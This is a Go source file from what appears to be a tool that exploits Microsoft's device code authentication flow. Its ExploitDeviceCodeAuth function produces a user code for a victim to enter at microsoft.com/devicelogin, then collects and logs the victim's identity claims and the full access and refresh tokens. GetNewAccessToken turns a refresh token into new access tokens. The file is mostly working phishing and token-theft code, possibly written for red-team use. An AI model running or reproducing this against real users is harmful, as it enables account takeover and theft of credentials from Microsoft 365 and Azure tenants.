package libs

import (
	"fmt"
	"io"
	"os"
	"strings"

	"github.com/dgrijalva/jwt-go"
	"github.com/rs/zerolog"
	"github.com/rs/zerolog/log"
)

func CheckErrors(err error) {
	if err != nil {
		log.Error().Err(err).Msg("[!] An error occured !")
	}
}

func ParseJWT(tokenstring string) map[string]interface{} {
	token, _, err := new(jwt.Parser).ParseUnverified(tokenstring, jwt.MapClaims{})
	CheckErrors(err)
	if claims, ok := token.Claims.(jwt.MapClaims); ok {
		return claims
	} else {
		return nil
	}
}

func Logging(filepath string) {
	f, err := os.OpenFile(filepath, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0664)
	CheckErrors(err)
	if err == nil {
		writers := io.MultiWriter(zerolog.ConsoleWriter{Out: os.Stderr, TimeFormat: "02 Jan 2006 15:04:05"}, f)
		log.Logger = log.Output(writers)
	}
}

func ExploitDeviceCodeAuth(clientid string, resource string) {
	log.Info().Msg("[*] Generating a new user code")
	respjson := GetuserCode(clientid, resource)
	user_code := respjson["user_code"].(string)
	log.Info().Msg("[+] User Code => " + user_code + " (https://microsoft.com/devicelogin)")
	tokens := GetAccessRefreshTokens(clientid, resource, respjson)
	if tokens != nil {
		access_token := tokens["access_token"].(string)
		refresh_token := tokens["refresh_token"].(string)
		jwtdata := ParseJWT(access_token)
		claims := []string{"tid", "appid", "oid", "amr", "upn", "name", "family_name", "given_name", "ipaddr", "tenant_region_scope"}
		claim_value := ""
		for _, claim := range claims {
			if jwtdata[claim] != nil {
				if claim == "amr" {
					claim_value = strings.Trim(strings.Join(strings.Fields(fmt.Sprint(jwtdata[claim])), ", "), "[]")
				} else {
					claim_value = jwtdata[claim].(string)
				}
				log.Info().Msg("[+] " + strings.ToUpper(claim) + ": " + claim_value)
			} else {
				log.Info().Msg("[!] " + strings.ToUpper(claim) + ": None")
			}
		}
		log.Info().Msg("[+] Access Token => " + access_token)
		log.Info().Msg("[+] Refresh Token => " + refresh_token)
	}
}

func GetNewAccessToken(clientid string, resource string, scope string, refreshtoken string) {
	log.Info().Msg("[*] Getting a new access token for the given resource: " + resource)
	tokens := GetAccessTokenFromResfreshToken(clientid, resource, scope, refreshtoken)
	if tokens != nil {
		access_token := tokens["access_token"].(string)
		refresh_token := tokens["refresh_token"].(string)
		log.Info().Msg("[+] Access Token => " + access_token)
		log.Info().Msg("[+] Refresh Token => " + refresh_token)
	}
}
